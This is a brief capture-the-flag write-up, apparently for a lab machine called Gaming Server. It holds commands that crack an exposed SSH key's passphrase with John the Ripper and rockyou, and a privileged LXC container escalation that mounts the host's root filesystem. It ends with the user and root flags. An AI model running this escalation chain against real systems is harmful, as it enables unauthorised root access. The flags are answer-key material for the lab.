# Gaming Server-Id rsa expose&lxc privilege escalation

```
export IP=10.10.17.242
```

# Material needed

1. Interesting directory: /secret

2. Passphrase key

```
python /opt/ssh2john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/root/Documents/wordlist/rockyou.txt id_rsa.hash
```

3. Privilege escalation

```
lxc image list
lxc image import ./alpine-v3.13-x86_64-20210606_0356.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

# Tasks

1. What is the user flag?

```
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

2. What is the root flag?

```
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```